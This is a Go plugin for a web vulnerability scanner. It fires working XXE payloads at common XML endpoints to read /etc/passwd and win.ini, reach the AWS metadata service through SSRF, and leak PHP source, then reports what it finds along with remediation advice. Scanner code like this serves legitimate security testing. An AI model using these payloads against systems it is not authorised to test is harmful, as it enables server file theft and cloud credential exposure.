package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"strings"
)

// ==================================================
// XXE INJECTION — v2.0 "XML Devil"
// Multiple endpoints · File Read · SSRF-via-XXE
// PHP wrapper · Spider integration
// ==================================================
type XXEPlugin struct{}

func (p *XXEPlugin) Name() string { return "XXE Injection (XML Devil v2)" }

func (p *XXEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	// ── Target endpoints ──────────────────────────────────────────────
	xmlEndpoints := []string{
		"/xml", "/upload", "/api", "/api/xml", "/rest", "/rest/xml",
		"/soap", "/xmlrpc.php", "/xmlrpc", "/sitemap.xml",
		"/parse", "/convert", "/import", "/feed", "/rss",
	}

	// ── XML payloads ─────────────────────────────────────────────────
	type XXEPayload struct {
		Name    string
		XML     string
		Sig     string // proof to be searched in response
		Desc    string
		Sev     string
		CVSS    float64
	}

	payloads := []XXEPayload{
		{
			Name: "XXE: Blind Entity Reflection",
			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe "DORM_XXE_8x9k">]>` +
				`<foo>&xxe;</foo>`,
			Sig:  "DORM_XXE_8x9k",
			Desc: "XML entity reflection test — parser processes external entities.",
			Sev:  "MEDIUM",
			CVSS: 7.5,
		},
		{
			Name: "XXE: Local File Read (Linux /etc/passwd)",
			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
				`<foo>&xxe;</foo>`,
			Sig:  "root:x:0:0",
			Desc: "/etc/passwd read via XXE — local file read confirmed.",
			Sev:  "CRITICAL",
			CVSS: 9.1,
		},
		{
			Name: "XXE: Local File Read (Windows win.ini)",
			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>` +
				`<foo>&xxe;</foo>`,
			Sig:  "[fonts]",
			Desc: "C:\\Windows\\win.ini read via XXE — Windows local file read confirmed.",
			Sev:  "CRITICAL",
			CVSS: 9.1,
		},
		{
			Name: "XXE: SSRF via XML External Entity",
			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>` +
				`<foo>&xxe;</foo>`,
			Sig:  "ami-id",
			Desc: "SSRF to AWS metadata endpoint occurred via XXE — internal network access confirmed.",
			Sev:  "HIGH",
			CVSS: 8.8,
		},
		{
			Name: "XXE: PHP Source Code Disclosure",
			XML: `<?xml version="1.0" encoding="ISO-8859-1"?>` +
				`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>` +
				`<foo>&xxe;</foo>`,
			Sig:  "PD9waHA", // base64 encoded "<?php" prefix
			Desc: "PHP source code leaked in base64 via php://filter wrapper.",
			Sev:  "HIGH",
			CVSS: 8.2,
		},
	}

	// ── Content-Type variants ─────────────────────────────────────────
	contentTypes := []string{
		"application/xml",
		"text/xml",
		"application/soap+xml",
	}

	// ── Static endpoints scanning ─────────────────────────────────────────
	for _, ep := range xmlEndpoints {
		targetURL := baseURL + ep
		for _, pl := range payloads {
			for _, ct := range contentTypes {
				resp, err := client.Post(targetURL, ct, strings.NewReader(pl.XML))
				if err != nil {
					continue
				}
				bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 131072))
				resp.Body.Close()
				body := string(bodyBytes)

				if strings.Contains(body, pl.Sig) {
					return &models.Vulnerability{
						Target:   target,
						Name:     pl.Name,
						Severity: pl.Sev,
						CVSS:     pl.CVSS,
						Description: fmt.Sprintf(
							"%s\nEndpoint: %s\nContent-Type: %s\nProof: '%s' was found in the response.",
							pl.Desc, targetURL, ct, pl.Sig,
						),
						Solution:  "Disable external entity processing in XML parser (FEATURE_SECURE_PROCESSING). Sanitize XML inputs from users.",
						Reference: "OWASP A05:2021 – Security Misconfiguration / XXE (CWE-611)",
					}
				}
			}
		}
	}

	// ── Spider endpoint integration ─────────────────────────────────────
	key := "endpoints_" + target.IP
	if existing, ok := models.SharedData.Load(key); ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if ep.Method != "POST" && ep.Method != "GET" {
				continue
			}
			for _, pl := range payloads {
				for _, ct := range contentTypes {
					resp, err := client.Post(ep.URL, ct, strings.NewReader(pl.XML))
					if err != nil {
						continue
					}
					bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 131072))
					resp.Body.Close()
					body := string(bodyBytes)

					if strings.Contains(body, pl.Sig) {
						return &models.Vulnerability{
							Target:   target,
							Name:     pl.Name + " (Spider-Discovered)",
							Severity: pl.Sev,
							CVSS:     pl.CVSS,
							Description: fmt.Sprintf(
								"%s\nEndpoint discovered by spider: %s\nContent-Type: %s\nProof: '%s' found.",
								pl.Desc, ep.URL, ct, pl.Sig,
							),
							Solution:  "Disable external entity processing in the XML parser.",
							Reference: "OWASP XXE (CWE-611)",
						}
					}
				}
			}
		}
	}

	return nil
}
